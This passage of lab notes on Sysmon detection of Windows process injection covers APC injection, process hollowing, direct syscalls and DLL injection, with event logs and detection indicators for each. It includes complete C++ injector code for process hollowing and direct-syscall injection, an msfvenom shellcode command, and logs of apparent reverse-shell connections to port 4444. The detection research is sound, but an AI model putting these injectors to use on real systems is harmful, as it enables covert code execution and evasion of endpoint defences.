CurrentDirectory: C:\Users\jens\Documents\procInj\
User: WIN11\jens
LogonGuid: {ED9BFE1B-2C5D-6A04-436B-060000000000}
LogonId: 0x66b43
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-381F-6A04-C702-000000000C00}
ParentProcessId: 3380
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Windows\System32\notepad.exe""
ParentUser: WIN11\jens"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-13 08:36:47.840
SourceProcessGUID: {ED9BFE1B-381F-6A04-C702-000000000C00}
SourceProcessId: 3380
SourceThreadId: 15216
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-381F-6A04-C802-000000000C00}
TargetProcessId: 11436
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000002EDA1C401BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-13 08:36:55.124
ProcessGuid: {ED9BFE1B-381F-6A04-C702-000000000C00}
ProcessId: 3380
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 52100
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis
No EID 8 which confirmed detection gap for APC injection as no thread is created so Sysmon CreateRemoteThread instrumentation never
fires. Detection relies entirely on EID 10 from process handle open where QueueUserAPC leaves no direct Sysmon
footprint.
| Step | Action                                  | Sysmon EID | Rule Triggered          |
|------|-----------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux   |
| 2    | Shellcode written to remote memory      | -          | -                       |
| 3    | APC queued to suspended main thread     | -          | -                       |
| 4    | Thread resumed — APC executes           | -          | -                       |
| 5    | Shellcode opens handle to cmd.exe       | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 8 absent** confirmed gap. QueueUserAPC reuses existing thread, cannot rely on EID 8 for APC detection.
- **EID 10** `GrantedAccess: 0x1fffff` only signal at injection time.
- **EID 10** `UNKNOWN(000002EDA1C401BC)` shellcode executing from
  anonymous memory. Same fingerprint as T1 and T2.


## T4. ProcessHollowing
Process hollowing creates a legitimate process suspended, unmaps its original image from memory, then maps malicious code in its place before resuming. The process looks legitimate from the outside with correct name, path, and PID but runs entirely different code. EID 25 should fire because Sysmon detects the in-memory image no longer matches the on-disk PE. Issue triggering revershell from hollowed process context so instead switch payload to launch calc.exe, however still issue spawning it but sysmon triggers on EID 25:
- msfvenom -p windows/x64/exec CMD=calc.exe -f c --arch x64 --platform windows -b "\x00\x0a\x0d"

| API Call                 | Layer      | Sysmon Event |
|--------------------------|------------|--------------|
| CreateProcess(SUSPENDED) | Win32      | -            |
| NtQueryInformationProcess| Native API | -            |
| ReadProcessMemory()      | Win32      | -            |
| NtUnmapViewOfSection()   | Native API | EID 25       |
| VirtualAllocEx()         | Win32      | -            |
| WriteProcessMemory()     | Win32      | -            |
| SetThreadContext()       | Win32      | -            |
| ResumeThread()           | Win32      | -            |

```
// t4_process_hollowing.cpp
#include "common.h"
#include <winternl.h>

typedef NTSTATUS(WINAPI* NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main() {
    wprintf(L"[*] Starting process hollowing x64...\n");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {
        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Suspended PID: %lu TID: %lu\n",
            pi.dwProcessId, pi.dwThreadId);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    auto NtQIP = (pNtQueryInformationProcess)GetProcAddress(
        ntdll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen = 0;
    NtQIP(pi.hProcess, ProcessBasicInformation,
          &pbi, sizeof(pbi), &retLen);
    wprintf(L"[+] PEB at: 0x%p\n", pbi.PebBaseAddress);

    // x64 PEB offset 0x10 = ImageBaseAddress
    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBase, sizeof(PVOID), &bytesRead);
    wprintf(L"[+] Remote image base: 0x%p\n", imageBase);

    // Unmap original image — EID 25 fires here
    auto myNtUnmap = (NtUnmapViewOfSection)GetProcAddress(
        ntdll, "NtUnmapViewOfSection");
    NTSTATUS st = myNtUnmap(pi.hProcess, imageBase);
    wprintf(L"[+] NtUnmapViewOfSection: 0x%08X\n", st);

    // Allocate at original base
    LPVOID newMem = VirtualAllocEx(
        pi.hProcess, imageBase,
        shellcode_size + 0x2000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!newMem) {
        wprintf(L"[!] Original base failed, using NULL\n");
        newMem = VirtualAllocEx(
            pi.hProcess, NULL,
            shellcode_size + 0x2000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }
    wprintf(L"[+] Allocated at: 0x%p\n", newMem);

    // Shellcode at +0x1000 for alignment
    LPVOID shellcodeAddr = (PVOID)((ULONG_PTR)newMem + 0x1000);

    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, shellcodeAddr,
                       shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n",
            written, shellcodeAddr);

    // Update PEB ImageBaseAddress
    WriteProcessMemory(pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &newMem, sizeof(PVOID), NULL);
    wprintf(L"[+] PEB ImageBase updated\n");

    // Verify bytes
    unsigned char verify[8] = {};
    ReadProcessMemory(pi.hProcess, shellcodeAddr, verify, 8, NULL);
    wprintf(L"[+] First bytes at Rip: ");
    for (int i = 0; i < 8; i++) wprintf(L"%02X ", verify[i]);
    wprintf(L"\n");

    // Get full thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    wprintf(L"[+] Original Rip: 0x%llx\n", ctx.Rip);
    wprintf(L"[+] Original Rsp: 0x%llx\n", ctx.Rsp);

    // x64 — Rip is instruction pointer
    ctx.Rip = (DWORD64)shellcodeAddr;

    // Align stack + shadow space
    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x28;

    SetThreadContext(pi.hThread, &ctx);
    wprintf(L"[+] Rip set to: 0x%p\n", shellcodeAddr);

    ResumeThread(pi.hThread);
    wprintf(L"[*] Resumed — watch for EID 25\n");

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```
### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-13 11:26:48.557
SourceProcessGUID: {ED9BFE1B-5FF8-6A04-1A02-000000000F00}
SourceProcessId: 6860
SourceThreadId: 13532
SourceImage: C:\Users\jens\Documents\procInj\t4_process_hollowing.exe
TargetProcessGUID: {ED9BFE1B-5FF8-6A04-1B02-000000000F00}
TargetProcessId: 10384
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88e86|C:\WINDOWS\System32\KERNEL32.DLL+3c624|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+1624|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+10d9|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process Tampering:
RuleName: -
UtcTime: 2026-05-13 11:26:48.646
ProcessGuid: {ED9BFE1B-5FF8-6A04-1B02-000000000F00}
ProcessId: 10384
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
Type: Image is replaced
User: WIN11\jens"


### Sysmon Analysis
EID 25 fired with Type: Image is replaced, confirms Sysmon detected the in-memory image mismatch caused by NtUnmapViewOfSection removing the original notepad image. Need to add RuleName to config so its not "-".
| Step | Action                                  | Sysmon EID | Rule Triggered          |
|------|-----------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux   |
| 2    | NtUnmapViewOfSection removes image      | EID 25     | Process Tampering       |
| 3    | Shellcode written to remote memory      | -          | -                       |
| 4    | Thread context redirected to shellcode  | -          | -                       |
| 5    | Thread resumed                          | -          | -                       |

### Key Indicators
- **EID 25** `Type: Image is replaced` On-disk PE no longer matches in-memory image.
- **EID 10** `GrantedAccess: 0x1fffff` injector opens handle to target.


## T5. Direct Syscall
Direct syscalls bypasses ntdll.dll entirely by executing the syscall instruction directly in your code. EDRs hook ntdll.dll functions in userland to intercept calls but direct syscalls jump straight past those hooks into the kernel. However Sysmon sits in the kernel and sees the same resulting kernel events regardless of how they were triggered.

| API Call                    | Layer          | Sysmon Event |
|-----------------------------|----------------|--------------|
| SysNtOpenProcess()          | Direct Syscall | EID 10       |
| SysNtAllocateVirtualMemory()| Direct Syscall | -            |
| SysNtWriteVirtualMemory()   | Direct Syscall | -            |
| SysNtCreateThreadEx()       | Direct Syscall | EID 8        |

| Function                 | SSN    |
|--------------------------|--------|
| NtOpenProcess            | 0x0026 |
| NtAllocateVirtualMemory  | 0x0018 |
| NtWriteVirtualMemory     | 0x003A |
| NtCreateThreadEx         | 0x00C9 |
| NtProtectVirtualMemory   | 0x0050 |

```
// t5_direct_syscall.cpp
#include "common.h"

// NT types needed for syscall signatures
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Syscall stubs declared in syscalls.asm
extern "C" {
    NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );
    NTSTATUS SysNtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    NTSTATUS SysNtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );
    NTSTATUS SysNtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );
}

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Build required structures for NtOpenProcess
    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(OBJECT_ATTRIBUTES);

    CLIENT_ID cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;

    // EID 10 fires here — kernel records handle open
    // ntdll hook bypassed — Sysmon still catches it
    HANDLE hProc = NULL;
    NTSTATUS st = SysNtOpenProcess(
        &hProc,
        PROCESS_VM_WRITE         |
        PROCESS_VM_OPERATION     |
        PROCESS_CREATE_THREAD    |
        PROCESS_QUERY_INFORMATION,
        &oa,
        &cid
    );
    wprintf(L"[+] SysNtOpenProcess: 0x%08X handle: 0x%p\n", st, hProc);
    if (!hProc) {
        wprintf(L"[-] Failed to open process\n");
        return 1;
    }

    // Allocate RWX memory in remote process
    PVOID remoteMem = NULL;
    SIZE_T allocSize = shellcode_size;
    st = SysNtAllocateVirtualMemory(
        hProc,
        &remoteMem,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    wprintf(L"[+] SysNtAllocateVirtualMemory: 0x%08X at 0x%p\n", st, remoteMem);
    if (st != 0) {
        wprintf(L"[-] Allocation failed\n");
        return 1;
    }

    // Write shellcode
    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(
        hProc,
        remoteMem,
        shellcode,
        shellcode_size,
        &written
    );
    wprintf(L"[+] SysNtWriteVirtualMemory: 0x%08X wrote %zu bytes\n", st, written);
    if (st != 0) {
        wprintf(L"[-] Write failed\n");
        return 1;
    }

    // EID 8 fires here — kernel thread creation event identical to T1/T2
    // ntdll hook bypassed — Sysmon still catches it
    HANDLE hThread = NULL;
    st = SysNtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        hProc,
        remoteMem,
        NULL,
        0,
        0, 0, 0,
        NULL
    );
    wprintf(L"[+] SysNtCreateThreadEx: 0x%08X\n", st);
    if (!hThread) {
        wprintf(L"[-] Thread creation failed\n");
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] ntdll hooks bypassed — Sysmon should still catch EID 8 and 10\n");
    wprintf(L"[*] Direct syscalls evade EDR userland hooks not kernel monitoring\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```


### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-13 12:15:29.716
SourceProcessGUID: {ED9BFE1B-6B61-6A04-F202-000000000F00}
SourceProcessId: 11744
SourceThreadId: 6944
SourceImage: C:\Users\jens\Documents\procInj\t5_direct_syscall.exe
TargetProcessGUID: {ED9BFE1B-6884-6A04-BD02-000000000F00}
TargetProcessId: 5500
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x142a
CallTrace: C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+185a|C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+161c|C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+10d9|C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-13 12:15:29.718
SourceProcessGuid: {ED9BFE1B-6B61-6A04-F202-000000000F00}
SourceProcessId: 11744
SourceImage: C:\Users\jens\Documents\procInj\t5_direct_syscall.exe
TargetProcessGuid: {ED9BFE1B-6884-6A04-BD02-000000000F00}
TargetProcessId: 5500
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 9912
StartAddress: 0x000001DE7DB20000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-13 12:15:29.885
SourceProcessGUID: {ED9BFE1B-6884-6A04-BD02-000000000F00}
SourceProcessId: 5500
SourceThreadId: 9912
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-6B61-6A04-F302-000000000F00}
TargetProcessId: 8056
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|UNKNOWN(000001DE7DB201BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-13 12:15:29.877
ProcessGuid: {ED9BFE1B-6B61-6A04-F302-000000000F00}
ProcessId: 8056
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-5BCF-6A04-9856-1A0000000000}
LogonId: 0x1a5698
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-6884-6A04-BD02-000000000F00}
ParentProcessId: 5500
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-13 12:15:27.820
ProcessGuid: {ED9BFE1B-6884-6A04-BD02-000000000F00}
ProcessId: 5500
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 63893
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis 
Direct syscalls produce identical kernel events as previous techniques as Sysmon kernel callbacks are completely unaffected by userland hook bypass. The key difference vs T1 and T2 is in the
EID 10 CallTrace and GrantedAccess value. NtOpenProcess via direct syscall enforces exact rights more strictly than Win32 OpenProcess. T5 CallTrace shows KERNELBASE.dll is absent from chain in T1/T2 it appeared between
ntdll and the injector binary because OpenProcess routes through it. In T5 the syscall jumps directly from the injector into the kernel bypassing KERNELBASE.dll entirely where OpenProcess actually lives. KERNEL32.DLL+2e957 in calltrace is from the mingw CRT runtime initialisation.

| Step | Action                              | Sysmon EID | Rule Triggered          |
|------|-------------------------------------|------------|-------------------------|
| 1    | SysNtOpenProcess to Notepad         | EID 10     | Process Injection       |
| 2    | SysNtAllocateVirtualMemory          | -          | -                       |
| 3    | SysNtWriteVirtualMemory             | -          | -                       |
| 4    | SysNtCreateThreadEx creates thread  | EID 8      | T1055 Process Injection |
| 5    | Shellcode opens handle to cmd.exe   | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 10** `GrantedAccess: 0x142a` first time minimal access mask
  appears in lab. Direct syscall requested exact rights needed, kernel
  granted them without promotion to 0x1fffff. Confirms access mask
  promotion observed in T1-T3 was a Win32 API behavior not a kernel behavior.
- **EID 10** `CallTrace: t5_direct_syscall.exe+185a` ntdll and KERNELBASE
  completely absent from injector call chain. Direct jump from binary into
  kernel with only KERNEL32 visible for CRT runtime. Strongest CallTrace
  difference vs all previous techniques.
- **EID 8** `StartModule: -` identical to T1 and T2. Kernel thread
  creation event survives complete bypass of userland API stack.
- **EID 10** `UNKNOWN(000001DE7DB201BC)` shellcode executing from
  anonymous memory. Same fingerprint as all previous techniques.


## T6. DLL Injection
Loads a malicious DLL into a target process by writing the DLL path
into remote memory and creating a thread that calls LoadLibraryA with
that path as its argument. Key difference from T1-T5 instead of
writing raw shellcode, a legitimate Windows API function is used as
the thread entry point. This changes the EID 8 StartModule from
anonymous memory to kernel32.dll.
| API Call              | Layer | Sysmon Event              |
|-----------------------|-------|---------------------------|
| OpenProcess()         | Win32 | EID 10                    |
| VirtualAllocEx()      | Win32 | —                         |
| WriteProcessMemory()  | Win32 | —                         |
| CreateRemoteThread()  | Win32 | EID 8                     |
| LoadLibraryA()        | Win32 | EID 7 (fires in target)   |



### Sysmon Data
1. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-13 13:07:45.537
SourceProcessGuid: {ED9BFE1B-77A1-6A04-4003-000000000F00}
SourceProcessId: 12740
SourceImage: C:\Users\jens\Documents\procInj\t6_dll_injection.exe
TargetProcessGuid: {ED9BFE1B-7536-6A04-3603-000000000F00}
TargetProcessId: 13264
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 14568
StartAddress: 0x00007FF9C66A2CD0
StartModule: C:\WINDOWS\System32\KERNEL32.DLL
StartFunction: LoadLibraryA
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2026-05-13 13:07:45.612
ProcessGuid: {ED9BFE1B-7536-6A04-3603-000000000F00}
ProcessId: 13264
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ImageLoaded: C:\temp\evil.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA1=007F10DC2375DF25CC581E4B6479F2D82309A9E9,MD5=D07D362A5955E813ADBBDD216EDB37D7,SHA256=B2D0B6FC749A23336D99615076A9B0E4B445CD35060F4D7212EDF418CCEA1A27,IMPHASH=57D6E7112C8E716CFE2EB0FF9F36763C
Signed: false
Signature: -
SignatureStatus: Unavailable
User: WIN11\jens"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-13 13:07:45.654
SourceProcessGUID: {ED9BFE1B-7536-6A04-3603-000000000F00}
SourceProcessId: 13264
SourceThreadId: 14568
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-77A1-6A04-4103-000000000F00}
TargetProcessId: 3640
TargetImage: C:\WINDOWS\system32\rundll32.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|C:\Temp\evil.dll+10ef|C:\Temp\evil.dll+1248|C:\WINDOWS\SYSTEM32\ntdll.dll+15f98a|C:\WINDOWS\SYSTEM32\ntdll.dll+12d23|C:\WINDOWS\SYSTEM32\ntdll.dll+6fc9c|C:\WINDOWS\SYSTEM32\ntdll.dll+5b0a|C:\WINDOWS\SYSTEM32\ntdll.dll+4c93|C:\WINDOWS\SYSTEM32\ntdll.dll+b6e4|C:\WINDOWS\SYSTEM32\ntdll.dll+b2f0|C:\WINDOWS\SYSTEM32\ntdll.dll+59370|C:\WINDOWS\System32\KERNELBASE.dll+337bf|C:\WINDOWS\System32\KERNELBASE.dll+ee1bd|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-13 13:07:46.037
ProcessGuid: {ED9BFE1B-77A2-6A04-4403-000000000F00}
ProcessId: 6356
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-5BCF-6A04-9856-1A0000000000}
LogonId: 0x1a5698
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-77A1-6A04-4103-000000000F00}
ParentProcessId: 3640
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: rundll32.exe
ParentUser: WIN11\jens"

5. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-13 13:07:46.045
SourceProcessGUID: {ED9BFE1B-77A1-6A04-4103-000000000F00}
SourceProcessId: 3640
SourceThreadId: 3852
SourceImage: C:\WINDOWS\system32\rundll32.exe
TargetProcessGUID: {ED9BFE1B-77A2-6A04-4403-000000000F00}
TargetProcessId: 6356
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|UNKNOWN(00000191BE240195)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

6. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-13 13:07:44.004
ProcessGuid: {ED9BFE1B-77A1-6A04-4103-000000000F00}
ProcessId: 3640
Image: C:\WINDOWS\system32\rundll32.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 63115
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"


### Sysmon Analysis
ID 10 for t6_dll_injection.exe opening handle to Notepad not present in the events. Only post-injection activity visible in EID 10. Check config that it includes
handle opens with PAGE_READWRITE allocation as DLL path uses RW not RWX.

| Step | Action                                  | Sysmon EID | Rule Triggered           |
|------|-----------------------------------------|------------|--------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux    |
| 2    | DLL path written to remote memory       | -          | -                        |
| 3    | CreateRemoteThread(LoadLibraryA)        | EID 8      | T1055 Process Injection  |
| 4    | LoadLibraryA loads evil.dll             | EID 7      | T1574.002 DLL Side-Load  |
| 5    | evil.dll opens handle to rundll32       | EID 10     | ProcessInjectionDelux    |

### Key Indicators
- **EID 8** `StartModule: kernel32.dll` thread starts from named
  legitimate module. StartFunction: LoadLibraryA visible strong DLL injection indicator.
- **EID 7** `ImageLoaded: C:\temp\evil.dll` unsigned DLL loaded from
  suspicious path.
- **EID 10** `CallTrace: evil.dll+10ef` named DLL module visible in
  call trace. Different from T1-T5 where UNKNOWN appeared.
- **EID 10** `UNKNOWN(00000191BE240195)` shellcode inside evil.dll
  executing from anonymous memory. DLL loaded itself then unpacked
  shellcode into allocated memory.
